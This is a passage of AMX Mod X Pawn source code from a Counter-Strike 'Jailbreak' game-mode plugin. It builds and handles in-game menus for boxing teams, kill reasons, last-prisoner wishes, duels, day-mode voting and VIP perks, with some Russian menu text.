	iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "\r[6] \w%L^n", id, "JBE_MENU_BOXING_TEAM_ADD_BLUE");
	iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "\r[7] \w%L^n^n", id, "JBE_MENU_BOXING_TEAM_SUB");
	iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "^n\r[9] \w%L", id, "JBE_MENU_BACK");
	formatex(szMenu[iLen], charsmax(szMenu) - iLen, "^n\r[0] \w%L", id, "JBE_MENU_EXIT");
	return show_menu(id, (1<<0|1<<4|1<<5|1<<6|1<<8|1<<9), szMenu, -1, "Show_BoxingTeamMenu");
}

public Handle_BoxingTeamMenu(id, iKey)
{
	if(g_iBoxingGame || g_iDayMode != 1 || id != g_iChiefId || IsNotSetBit(g_iBitUserAlive, id)) return PLUGIN_HANDLED;
	switch(iKey)
	{
		case 0: jbe_boxing_divide_team();
		case 6:
		{
			new iTarget, iBody;
			get_user_aiming(id, iTarget, iBody, 9999);
			if(jbe_is_user_valid(iTarget) && IsSetBit(g_iBitUserBoxing, iTarget))
			{
				ClearBit(g_iBitUserBoxing, iTarget);
				new iActiveItem = get_pdata_cbase(iTarget, m_pActiveItem);
				if(iActiveItem > 0)
				{
					ExecuteHamB(Ham_Item_Deploy, iActiveItem);
					UTIL_WeaponAnimation(iTarget, 3);
				}
				set_pev(iTarget, pev_health, 100.0);
				set_pdata_int(iTarget, m_bloodColor, 247);
			}
			else UTIL_SayText(id, "%L %L", LANG_PLAYER, "JBE_PREFIX", LANG_PLAYER, "JBE_CHAT_ID_PLAYERS_NOT_VALID");
			return Show_BoxingTeamMenu(id);
		}
		case 8: return Show_BoxingMenu(id);
		case 9: return PLUGIN_HANDLED;
		default:
		{
			new iTarget, iBody;
			get_user_aiming(id, iTarget, iBody, 9999);
			if(jbe_is_user_valid(iTarget) && g_iUserTeam[iTarget] == 1 && IsSetBit(g_iBitUserAlive, iTarget) && IsNotSetBit(g_iBitUserFree, iTarget) && IsNotSetBit(g_iBitUserWanted, iTarget) && IsNotSetBit(g_iBitUserSoccer, iTarget) && IsNotSetBit(g_iBitUserDuel, iTarget))
			{
				if(IsNotSetBit(g_iBitUserBoxing, iTarget))
				{
					SetBit(g_iBitUserBoxing, iTarget);
					set_pev(iTarget, pev_health, 100.0);
					set_pdata_int(iTarget, m_bloodColor, -1);
					ClearBit(g_iBitClothingType, iTarget);
				}
				g_iBoxingUserTeam[iTarget] = iKey - 4;
				if(get_user_weapon(iTarget) != CSW_KNIFE) engclient_cmd(iTarget, "weapon_knife");
				else
				{
					new iActiveItem = get_pdata_cbase(iTarget, m_pActiveItem);
					if(iActiveItem > 0)
					{
						ExecuteHamB(Ham_Item_Deploy, iActiveItem);
						UTIL_WeaponAnimation(iTarget, 3);
					}
				}
			}
			else UTIL_SayText(id, "%L %L", LANG_PLAYER, "JBE_PREFIX", LANG_PLAYER, "JBE_CHAT_ID_PLAYERS_NOT_VALID");
			return Show_BoxingTeamMenu(id);
		}
	}
	return Show_BoxingMenu(id);
}

Show_KillReasonsMenu(id, iTarget)
{
	jbe_informer_offset_up(id);
	jbe_menu_block(id);
	new szName[32], szMenu[512], iLen;
	get_user_name(iTarget, szName, charsmax(szName));
	iLen = formatex(szMenu, charsmax(szMenu), "\w%L^n^n", id, "JBE_MENU_KILL_REASON_TITLE", szName);
	iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "\r[1] \w%L^n", id, "JBE_MENU_KILL_REASON_0");
	iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "\r[2] \w%L^n", id, "JBE_MENU_KILL_REASON_1");
	iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "\r[3] \w%L^n", id, "JBE_MENU_KILL_REASON_2");
	iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "\r[4] \w%L^n", id, "JBE_MENU_KILL_REASON_3");
	iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "\r[5] \w%L^n", id, "JBE_MENU_KILL_REASON_4");
	iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "\r[6] \w%L^n", id, "JBE_MENU_KILL_REASON_5");
	iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "\r[7] \w%L^n", id, "JBE_MENU_KILL_REASON_6");
	iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "\r[8] \w%L^n", id, "JBE_MENU_KILL_REASON_7");
	iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "^n\r[9] \w%L", id, "JBE_MENU_BACK");
	formatex(szMenu[iLen], charsmax(szMenu) - iLen, "^n\r[#] \d%L", id, "JBE_MENU_EXIT");
	return show_menu(id, (1<<0|1<<1|1<<2|1<<3|1<<4|1<<5|1<<6|1<<7|1<<8), szMenu, -1, "Show_KillReasonsMenu");
}

public Handle_KillReasonsMenu(id, iKey)
{
	switch(iKey)
	{
		case 8: return Cmd_KilledUsersMenu(id);
		default:
		{
			if(IsSetBit(g_iBitKilledUsers[id], g_iMenuTarget[id]))
			{
				new szName[32], szNameTarget[32], szLangPlayer[32];
				get_user_name(id, szName, charsmax(szName));
				get_user_name(g_iMenuTarget[id], szNameTarget, charsmax(szNameTarget));
				formatex(szLangPlayer, charsmax(szLangPlayer), "JBE_MENU_KILL_REASON_%d", iKey);
				UTIL_SayText(0, "%L %L", LANG_PLAYER, "JBE_PREFIX", LANG_PLAYER, "JBE_CHAT_ALL_KILL_REASON", szName, szNameTarget, LANG_PLAYER, szLangPlayer);
				if(iKey == 7)
				{
					UTIL_SayText(0, "%L %L", LANG_PLAYER, "JBE_PREFIX", LANG_PLAYER, "JBE_CHAT_ALL_AUTO_FREE_DAY", szNameTarget);
					jbe_add_user_free_next_round(g_iMenuTarget[id]);
				}
				ClearBit(g_iBitKilledUsers[id], g_iMenuTarget[id]);
				if(g_iBitKilledUsers[id]) return Cmd_KilledUsersMenu(id);
				jbe_menu_unblock(id);
			}
			else
			{
				if(g_iBitKilledUsers[id]) return Cmd_KilledUsersMenu(id);
				UTIL_SayText(id, "%L %L", LANG_PLAYER, "JBE_PREFIX", LANG_PLAYER, "JBE_CHAT_ID_KILLED_USER_DISCONNECT");
				jbe_menu_unblock(id);
			}
		}
	}
	return PLUGIN_HANDLED;
}

Cmd_KilledUsersMenu(id) return Show_KilledUsersMenu(id, g_iMenuPosition[id] = 0);
Show_KilledUsersMenu(id, iPos)
{
	if(iPos < 0) return PLUGIN_HANDLED;
	jbe_informer_offset_up(id);
	new iPlayersNum;
	for(new i = 1; i <= g_iMaxPlayers; i++)
	{
		if(IsNotSetBit(g_iBitKilledUsers[id], i)) continue;
		g_iMenuPlayers[id][iPlayersNum++] = i;
	}
	new iStart = iPos * PLAYERS_PER_PAGE;
	if(iStart > iPlayersNum) iStart = iPlayersNum;
	iStart = iStart - (iStart % 8);
	g_iMenuPosition[id] = iStart / PLAYERS_PER_PAGE;
	new iEnd = iStart + PLAYERS_PER_PAGE;
	if(iEnd > iPlayersNum) iEnd = iPlayersNum;
	new szMenu[512], iLen, iPagesNum = (iPlayersNum / PLAYERS_PER_PAGE + ((iPlayersNum % PLAYERS_PER_PAGE) ? 1 : 0));
	switch(iPagesNum)
	{
		case 0:
		{
			UTIL_SayText(id, "%L %L", LANG_PLAYER, "JBE_PREFIX", LANG_PLAYER, "JBE_CHAT_ID_KILLED_USER_DISCONNECT");
			jbe_menu_unblock(id);
			return PLUGIN_HANDLED;
		}
		default: iLen = formatex(szMenu, charsmax(szMenu), "\w%L \w[%d/%d]^n^n", id, "JBE_MENU_KILLED_USERS_TITLE", iPos + 1, iPagesNum);
	}
	new szName[32], i, iKeys, b;
	for(new a = iStart; a < iEnd; a++)
	{
		i = g_iMenuPlayers[id][a];
		get_user_name(i, szName, charsmax(szName));
		iKeys |= (1<<b);
		iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "\r[%d] \w%s^n", ++b, szName);
	}
	for(new i = b; i < PLAYERS_PER_PAGE; i++) iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "^n");
	if(iEnd < iPlayersNum)
	{
		iKeys |= (1<<8);
		if(iPos)
		{
			formatex(szMenu[iLen], charsmax(szMenu) - iLen, "^n\r[9] \w%L^n\r[0] \w%L", id, "JBE_MENU_NEXT", id, "JBE_MENU_BACK");
			iKeys |= (1<<9);
		}
		else formatex(szMenu[iLen], charsmax(szMenu) - iLen, "^n\r[9] \w%L^n\r[#] \d%L", id, "JBE_MENU_NEXT", id, "JBE_MENU_EXIT");
	}
	else
	{
		if(iPos)
		{
			formatex(szMenu[iLen], charsmax(szMenu) - iLen, "^n^n\r[0] \w%L", id, "JBE_MENU_BACK");
			iKeys |= (1<<9);
		}
		else formatex(szMenu[iLen], charsmax(szMenu) - iLen, "^n^n\r[#] \d%L", id, "JBE_MENU_EXIT");
	}
	return show_menu(id, iKeys, szMenu, -1, "Show_KilledUsersMenu");
}

public Handle_KilledUsersMenu(id, iKey)
{
	switch(iKey)
	{
		case 8: return Show_KilledUsersMenu(id, ++g_iMenuPosition[id]);
		case 9: return Show_KilledUsersMenu(id, --g_iMenuPosition[id]);
		default:
		{
			g_iMenuTarget[id] = g_iMenuPlayers[id][g_iMenuPosition[id] * PLAYERS_PER_PAGE + iKey];
			if(IsSetBit(g_iBitKilledUsers[id], g_iMenuTarget[id])) return Show_KillReasonsMenu(id, g_iMenuTarget[id]);
			else if(g_iBitKilledUsers[id]) return Cmd_KilledUsersMenu(id);
			UTIL_SayText(id, "%L %L", LANG_PLAYER, "JBE_PREFIX", LANG_PLAYER, "JBE_CHAT_ID_KILLED_USER_DISCONNECT");
			jbe_menu_unblock(id);
		}
	}
	return PLUGIN_HANDLED;
}

Show_LastPrisonerMenu(id)
{
    if(g_iDuelStatus || IsNotSetBit(g_iBitUserAlive, id) || id != g_iLastPnId) return PLUGIN_HANDLED;
    new szMenu[512], iLen = formatex(szMenu, charsmax(szMenu), "\wПоследнее желание^n^n");
    iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "\r[1] \wОткрыть клетки^n");
    iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "\r[2] \wДеньги: \y$%d^n", g_iAllCvars[LAST_PRISONER_MODEY]);
    iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "\r[3] \wГолос на раунд^n");
    iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "\r[4] \wУбить охрану^n");
    iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "\r[5] \wВыбрать Дуэль^n");
    iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "\r[6] \wОсвобождение^n^n");
    formatex(szMenu[iLen], charsmax(szMenu) - iLen, "\r[0] \wВыход");
    return show_menu(id, (1<<0|1<<1|1<<2|1<<3|1<<4|1<<5|1<<6|1<<7|1<<9), szMenu, -1, "Show_LastPrisonerMenu");
}

public Handle_LastPrisonerMenu(id, iKey)
{
    if(g_iDuelStatus || IsNotSetBit(g_iBitUserAlive, id) || id != g_iLastPnId) return PLUGIN_HANDLED;
    switch(iKey)
    {
        case 0:
        {
            jbe_open_doors();
        }
        case 1:
        {
            ExecuteHamB(Ham_Killed, id, id, 0);
            jbe_set_user_money(id, g_iUserMoney[id] + g_iAllCvars[LAST_PRISONER_MODEY], 1);
            remove_task(TASK_LAST_DIE);
            new szName[32];
            get_user_name(id, szName, charsmax(szName));
			UTIL_SayText(0, "%L %L", LANG_PLAYER, "JBE_PREFIX", LANG_PLAYER, "JBE_CHAT_ALL_MONEY", szName);
        }
        case 2:
        {
            ExecuteHamB(Ham_Killed, id, id, 0);
            SetBit(g_iBitUserVoiceNextRound, id);
            remove_task(TASK_LAST_DIE);
            new szName[32];
            get_user_name(id, szName, charsmax(szName));
			UTIL_SayText(0, "%L %L", LANG_PLAYER, "JBE_PREFIX", LANG_PLAYER, "JBE_CHAT_ALL_GOLOS", szName);
        }
        case 3:
        {
            if(g_iPlayersNum[2] > 0)
            {
                for(new i = 1; i <= g_iMaxPlayers; i++)
                {
                    if(IsNotSetBit(g_iBitUserAlive, i) || g_iUserTeam[i] != 2) continue;
                    fm_strip_user_weapons(i, 1);
                    set_user_godmode(i, 0);
                }
                fm_give_item(id, "weapon_ak47");
                fm_set_user_bpammo(id, CSW_AK47, 200);
                g_iLastPnId = 0;
                remove_task(TASK_LAST_DIE);
                new szName[32];
                get_user_name(id, szName, charsmax(szName));
				UTIL_SayText(0, "%L %L", LANG_PLAYER, "JBE_PREFIX", LANG_PLAYER, "JBE_CHAT_ALL_WEAPONS_YES", szName);
                set_task(1.0, "jbe_lastdie_count_down", TASK_LAST_DIE, _, _, "a", g_iLastDieCountDown = 50 + 1);
            }
            else if(g_iPlayersNum[2] < 1) UTIL_SayText(id, "%L %L", LANG_PLAYER, "JBE_PREFIX", LANG_PLAYER, "JBE_CHAT_ALL_WEAPONS_NO");
        }
        case 4: return Show_ChoicePrizeMenu(id);
        case 5:
        {
            if(g_iPlayersNum[2] > 0)
            {
                ExecuteHamB(Ham_Killed, id, id, 0);
                jbe_add_user_free_next_round(id);
                remove_task(TASK_LAST_DIE);
                new szName[32];
                get_user_name(id, szName, charsmax(szName));
				UTIL_SayText(0, "%L %L", LANG_PLAYER, "JBE_PREFIX", LANG_PLAYER, "JBE_CHAT_ALL_FD_YES", szName);
            }
            else if(g_iPlayersNum[2] < 1) UTIL_SayText(id, "%L %L", LANG_PLAYER, "JBE_PREFIX", LANG_PLAYER, "JBE_CHAT_ALL_FD_NO_KT");
        }
    }
    return PLUGIN_HANDLED;
}

/* Выдача фд другу -> */
Cmd_FreeDayFriend(id) return Show_FreeDayFriend(id, g_iMenuPosition[id] = 0);
Show_FreeDayFriend(id, iPos)
{
    if(iPos < 0 || id != g_iLastPnId || IsNotSetBit(g_iBitUserAlive, id)) return PLUGIN_HANDLED;
    new iPlayersNum;
    for(new i = 1; i <= g_iMaxPlayers; i++)
    {
        if(IsSetBit(g_iBitUserConnected, i) && g_iUserTeam[i] == 1 && id != i) 
			g_iMenuPlayers[id][iPlayersNum++] = i;
    }
    new iStart = iPos * PLAYERS_PER_PAGE;
    if(iStart > iPlayersNum) iStart = iPlayersNum;
    iStart = iStart - (iStart % 8);
    g_iMenuPosition[id] = iStart / PLAYERS_PER_PAGE;
    new iEnd = iStart + PLAYERS_PER_PAGE;
    if(iEnd > iPlayersNum) iEnd = iPlayersNum;
    new szMenu[512], iLen, iPagesNum = (iPlayersNum / PLAYERS_PER_PAGE + ((iPlayersNum % PLAYERS_PER_PAGE) ? 1 : 0));
    switch(iPagesNum)
    {
        case 0:
        {
            UTIL_SayText(id, "!g[Желание] %L", id, "JBE_CHAT_ID_PLAYERS_NOT_VALID");
            return PLUGIN_HANDLED;
        }
        default: iLen = formatex(szMenu, charsmax(szMenu), "\wОсвобождение другу [%d/%d]^n^n", iPos + 1, iPagesNum);
    }
    new szName[32], i, iKeys = (1<<9), b;
    for(new a = iStart; a < iEnd; a++)
    {
        i = g_iMenuPlayers[id][a];
        get_user_name(i, szName, charsmax(szName));
        iKeys |= (1<<b);
        iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "\r[%d] \w%s^n", ++b, szName);
    }
    for(new i = b; i < PLAYERS_PER_PAGE; i++) iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "^n");
    if(iEnd < iPlayersNum)
    {
        iKeys |= (1<<8);
        formatex(szMenu[iLen], charsmax(szMenu) - iLen, "^n\r[9] \w%L^n\r[0] \w%L", id, "JBE_MENU_NEXT", id, iPos ? "JBE_MENU_BACK" : "JBE_MENU_EXIT");
    }
    else formatex(szMenu[iLen], charsmax(szMenu) - iLen, "^n^n\r[0] \w%L", id, iPos ? "JBE_MENU_BACK" : "JBE_MENU_EXIT");
    return show_menu(id, iKeys, szMenu, -1, "Show_FreeDayFriend");
}

public Handle_FreeDayFriend(id, iKey)
{
    if(IsNotSetBit(g_iBitUserAlive, id) || g_iAlivePlayersNum[1] > 1) return PLUGIN_HANDLED;
    switch(iKey)
    {
        case 8: return Show_FreeDayFriend(id, ++g_iMenuPosition[id]);
        case 9: return Show_FreeDayFriend(id, --g_iMenuPosition[id]);
        default:
        {
            new iTarget = g_iMenuPlayers[id][g_iMenuPosition[id] * PLAYERS_PER_PAGE + iKey];
            if(IsSetBit(g_iBitUserConnected, iTarget) && g_iUserTeam[iTarget] == 1)
            {
				if(g_iDuelPrize != -2)
				{
					new szName[32], szTargetName[32];
					get_user_name(id, szName, charsmax(szName));
					get_user_name(iTarget, szTargetName, charsmax(szTargetName));
					UTIL_SayText(0, "%L %L", LANG_PLAYER, "JBE_PREFIX", LANG_PLAYER, "JBE_CHAT_ALL_FD_PLAYER", szName);
					SetBit(g_iBitUserFreeNextRound, iTarget);
					remove_task(TASK_LAST_DIE);
					ExecuteHamB(Ham_Killed, id, id, 0);
				}
				else 
				{
					g_iDuelPrize = iTarget;
					return Show_ChoiceDuelMenu(id);
				}
            }
        }
    }
    return PLUGIN_HANDLED;
}
/* <- Выдача фд другу */

Show_ChoicePrizeMenu(id)
{
	if(IsNotSetBit(g_iBitUserAlive, id) || id != g_iLastPnId) return PLUGIN_HANDLED;
	jbe_informer_offset_up(id);
	new szMenu[512], iLen = formatex(szMenu, charsmax(szMenu), "Выбор приза^n^n");
	iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "\r[1] \wОсвобождение^n");
	iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "\r[2] \wОсвобождение друга^n");
	iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "\r[3] \w1500$^n");
	iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "^n\r[9] \w%L", id, "JBE_MENU_BACK");
	formatex(szMenu[iLen], charsmax(szMenu) - iLen, "^n\r[0] \w%L", id, "JBE_MENU_EXIT");
	return show_menu(id, (1<<0|1<<1|1<<2|1<<8|1<<9), szMenu, -1, "Show_ChoicePrizeMenu");
}

public Handle_ChoicePrizeMenu(id, iKey)
{
    if(IsNotSetBit(g_iBitUserAlive, id) || id != g_iLastPnId || iKey == 9) return PLUGIN_HANDLED;
    switch(iKey)
    {
		case 0: g_iDuelPrize = -3;
		case 1: { g_iDuelPrize = -2; return Cmd_FreeDayFriend(id); }
		case 2: g_iDuelPrize = -1;
		case 8: return Show_LastPrisonerMenu(id);
    }
    return Show_ChoiceDuelMenu(id);
}

Show_ChoiceDuelMenu(id)
{
	if(IsNotSetBit(g_iBitUserAlive, id) || id != g_iLastPnId) return PLUGIN_HANDLED;
	jbe_informer_offset_up(id);
	new szMenu[512], iLen = formatex(szMenu, charsmax(szMenu), "%L^n^n", id, "JBE_MENU_CHOICE_DUEL_TITLE");
	iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "\r[1] \wНож^n");
	iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "\r[2] \wДигл^n");
	iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "\r[3] \wДробовик^n");
	iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "\r[4] \wСкаут^n");
	iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "\r[5] \wАвтомат^n");
	iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "\r[6] \wАвп^n");
	iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "^n\r[9] \w%L", id, "JBE_MENU_BACK");
	formatex(szMenu[iLen], charsmax(szMenu) - iLen, "^n\r[0] \w%L", id, "JBE_MENU_EXIT");
	return show_menu(id, (1<<0|1<<1|1<<2|1<<3|1<<4|1<<5|1<<8|1<<9), szMenu, -1, "Show_ChoiceDuelMenu");
}

public Handle_ChoiceDuelMenu(id, iKey)
{
    if(IsNotSetBit(g_iBitUserAlive, id) || id != g_iLastPnId || iKey == 9) return PLUGIN_HANDLED;
    switch(iKey)
    {
		case 8: return Show_ChoicePrizeMenu(id);
		default: g_iDuelType = iKey + 1;
    }
    return Cmd_DuelUsersMenu(id);
}

Cmd_DuelUsersMenu(id) return Show_DuelUsersMenu(id, g_iMenuPosition[id] = 0);
Show_DuelUsersMenu(id, iPos)
{
	if(iPos < 0 || IsNotSetBit(g_iBitUserAlive, id) || id != g_iLastPnId) return PLUGIN_HANDLED;
	jbe_informer_offset_up(id);
	new iPlayersNum;
	for(new i = 1; i <= g_iMaxPlayers; i++)
	{
		if(g_iUserTeam[i] != 2 || IsNotSetBit(g_iBitUserAlive, i)) continue;
		g_iMenuPlayers[id][iPlayersNum++] = i;
	}
	new iStart = iPos * PLAYERS_PER_PAGE;
	if(iStart > iPlayersNum) iStart = iPlayersNum;
	iStart = iStart - (iStart % 8);
	g_iMenuPosition[id] = iStart / PLAYERS_PER_PAGE;
	new iEnd = iStart + PLAYERS_PER_PAGE;
	if(iEnd > iPlayersNum) iEnd = iPlayersNum;
	new szMenu[512], iLen, iPagesNum = (iPlayersNum / PLAYERS_PER_PAGE + ((iPlayersNum % PLAYERS_PER_PAGE) ? 1 : 0));
	switch(iPagesNum)
	{
		case 0:
		{
			UTIL_SayText(id, "%L %L", LANG_PLAYER, "JBE_PREFIX", LANG_PLAYER, "JBE_CHAT_ID_PLAYERS_NOT_VALID");
			return Show_ChiefMenu_1(id);
		}
		default: iLen = formatex(szMenu, charsmax(szMenu), "\w%L \w[%d/%d]^n^n", id, "JBE_MENU_DUEL_USERS", iPos + 1, iPagesNum);
	}
	new szName[32], i, iKeys = (1<<9), b;
	for(new a = iStart; a < iEnd; a++)
	{
		i = g_iMenuPlayers[id][a];
		get_user_name(i, szName, charsmax(szName));
		iKeys |= (1<<b);
		iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "\r[%d] \w%s^n", ++b, szName);
	}
	for(new i = b; i < PLAYERS_PER_PAGE; i++) iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "^n");
	if(iEnd < iPlayersNum)
	{
		iKeys |= (1<<8);
		formatex(szMenu[iLen], charsmax(szMenu) - iLen, "^n\r[9] \w%L^n\r[0] \w%L", id, "JBE_MENU_NEXT", id, iPos ? "JBE_MENU_BACK" : "JBE_MENU_EXIT");
	}
	else formatex(szMenu[iLen], charsmax(szMenu) - iLen, "^n^n\r[0] \w%L", id, iPos ? "JBE_MENU_BACK" : "JBE_MENU_EXIT");
	return show_menu(id, iKeys, szMenu, -1, "Show_DuelUsersMenu");
}

public Handle_DuelUsersMenu(id, iKey)
{
	if(IsNotSetBit(g_iBitUserAlive, id) || id != g_iLastPnId) return PLUGIN_HANDLED;
	switch(iKey)
	{
		case 8: Show_DuelUsersMenu(id, ++g_iMenuPosition[id]);
		case 9: Show_DuelUsersMenu(id, --g_iMenuPosition[id]);
		default:
		{
			new iTarget = g_iMenuPlayers[id][g_iMenuPosition[id] * PLAYERS_PER_PAGE + iKey];
			if(IsSetBit(g_iBitUserAlive, iTarget)) jbe_duel_start_ready(id, iTarget);
			else Show_DuelUsersMenu(id, g_iMenuPosition[id]);
			remove_task(TASK_LAST_DIE);	
		}
	}
	return PLUGIN_HANDLED;
}

Show_DayModeMenu(id, iPos)
{
	if(iPos < 0) return Show_DayModeMenu(id, g_iMenuPosition[id] = 0);
	new iStart = iPos * PLAYERS_PER_PAGE;
	if(iStart > g_iDayModeListSize) iStart = g_iDayModeListSize;
	iStart = iStart - (iStart % 8);
	g_iMenuPosition[id] = iStart / PLAYERS_PER_PAGE;
	new iEnd = iStart + PLAYERS_PER_PAGE;
	if(iEnd > g_iDayModeListSize) iEnd = g_iDayModeListSize;
	new szMenu[512], iLen, iPagesNum = (g_iDayModeListSize / PLAYERS_PER_PAGE + ((g_iDayModeListSize % PLAYERS_PER_PAGE) ? 1 : 0));
	if(g_iDayWeek == 6) iLen = formatex(szMenu, charsmax(szMenu), "\w%L [%d/%d]^n\d%L^n\d%L^n^n", id, "JBE_MENU_VOTE_DAY_MODE_TITLE", iPos + 1, iPagesNum, id, "JBE_VOTE_PRISONER", id, "JBE_MENU_VOTE_DAY_MODE_TIME_END", g_iDayModeVoteTime);
	else if(g_iDayWeek == 7) iLen = formatex(szMenu, charsmax(szMenu), "\w%L [%d/%d]^n\d%L^n\d%L^n^n", id, "JBE_MENU_VOTE_DAY_MODE_TITLE", iPos + 1, iPagesNum, id, "JBE_VOTE_GUARD", id, "JBE_MENU_VOTE_DAY_MODE_TIME_END", g_iDayModeVoteTime);
	new aDataDayMode[DATA_DAY_MODE], iKeys = (1<<9), b;
	for(new a = iStart; a < iEnd; a++)
	{
		ArrayGetArray(g_aDataDayMode, a, aDataDayMode);
		if(aDataDayMode[MODE_BLOCKED]) iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "\r[%d] \d%L^n", ++b, id, aDataDayMode[LANG_MODE], id, "JBE_MENU_VOTE_DAY_MODE_BLOCKED");
		else
		{
			if(IsSetBit(g_iBitUserDayModeVoted, id)) iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "\r[%d] \d%L \r[\y%d\r]^n", ++b, id, aDataDayMode[LANG_MODE], aDataDayMode[VOTES_NUM]);
			else
			{
				iKeys |= (1<<b);
				iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "\r[%d] \w%L \r[\y%d\r]^n", ++b, id, aDataDayMode[LANG_MODE], aDataDayMode[VOTES_NUM]);
			}
		}
	}
	for(new i = b; i < PLAYERS_PER_PAGE; i++) iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "^n");
	if(iEnd < g_iDayModeListSize)
	{
		iKeys |= (1<<8);
		formatex(szMenu[iLen], charsmax(szMenu) - iLen, "^n\r[9] \w%L^n\r[0] \w%L", id, "JBE_MENU_NEXT", id, iPos ? "JBE_MENU_BACK" : "JBE_MENU_EXIT");
	}
	else formatex(szMenu[iLen], charsmax(szMenu) - iLen, "^n\r[0] \w%L", id, iPos ? "JBE_MENU_BACK" : "JBE_MENU_EXIT");
	return show_menu(id, iKeys, szMenu, 2, "Show_DayModeMenu");
}

public Handle_DayModeMenu(id, iKey)
{
    new szName[32];
	get_user_name(id, szName, charsmax(szName));
	
	switch(iKey)
	{
		case 8: return Show_DayModeMenu(id, ++g_iMenuPosition[id]);
        case 9: return Show_DayModeMenu(id, --g_iMenuPosition[id]);
		default:
		{
			new aDataDayMode[DATA_DAY_MODE], iDayMode = g_iMenuPosition[id] * PLAYERS_PER_PAGE + iKey;
			ArrayGetArray(g_aDataDayMode, iDayMode, aDataDayMode);
			aDataDayMode[VOTES_NUM]++;
			ArraySetArray(g_aDataDayMode, iDayMode, aDataDayMode);
			SetBit(g_iBitUserDayModeVoted, id);
			UTIL_SayText(0, "%L !g%s !tпроголосовал за игру !g'%L'", LANG_PLAYER, "JBE_PREFIX", szName, id, aDataDayMode[LANG_MODE]);
		}
	}
	return Show_DayModeMenu(id, g_iMenuPosition[id]);
}

Show_VipMenu(id)
{
	if(g_iDayMode != 1 && g_iDayMode != 2 || jbe_menu_blocked(id)) return PLUGIN_HANDLED;
	new szMenu[512], iKeys = (1<<8|1<<9), iAlive = IsSetBit(g_iBitUserAlive, id), iLen = formatex(szMenu, charsmax(szMenu), "\w%L^n^n", id, "JBE_MENU_VIP_TITLE");
	
	if(!iAlive && !g_szWantedNames[0] && g_iDayMode == 2)
	{
		iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "\r[1] \w%L^n", id, "JBE_MENU_VIP_RESPAWN");
		iKeys |= (1<<0);
	}
	else iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "\r[#]\d \d%L \d[\rFreeDay\d]^n", id, "JBE_MENU_VIP_RESPAWN");
	
	if(iAlive && g_iVipHealth[id] && get_user_health(id) < 100)
	{
		iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "\r[2] \w%L^n", id, "JBE_MENU_VIP_HEALTH", g_iVipHealth[id]);
		iKeys |= (1<<1);
	}
	else iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "\r[#]\d \d%L^n", id, "JBE_MENU_VIP_HEALTH", g_iVipHealth[id]);
	
	if(iAlive && g_iBomjData[id][MONEY_VIP] >= g_iAllCvars[VIP_MONEY_ROUND])
	{
		iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "\r[3] \w%L^n", id, "JBE_MENU_VIP_MONEY", g_iAllCvars[VIP_MONEY_NUM]);
		iKeys |= (1<<2);
	}
	else iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "\r[#]\d \d%L \d[\rчрз %d рнд\d]^n", id, "JBE_MENU_VIP_MONEY", g_iAllCvars[VIP_MONEY_NUM], g_iAllCvars[VIP_MONEY_ROUND]);
	
	if(iAlive && g_iBomjData[id][GOLOS_VIP] >= g_iAllCvars[VIP_VOICE_ROUND])
	{
		if(IsNotSetBit(g_iBitUserVoice, id) && g_iUserTeam[id] == 1)
		{
			iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "\r[4] \w%L^n", id, "JBE_MENU_VIP_VOICE");
			iKeys |= (1<<3);
		}
		else iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "\r[#]\d \d%L \d[\wУже есть\d]^n", id, "JBE_MENU_VIP_VOICE");
	}
	else iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "\r[#]\d \d%L \d[\rчрз %d рнд\d]^n", id, "JBE_MENU_VIP_VOICE", g_iAllCvars[VIP_VOICE_ROUND]);
	
	if(iAlive && g_iBomjData[id][SPEED_VIP] >= g_iAllCvars[VIP_SPEED_ROUND])
	{
		if(IsNotSetBit(g_iBitFastRun, id))
		{
			iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "\r[5] \w%L^n", id, "JBE_MENU_VIP_SPEED");
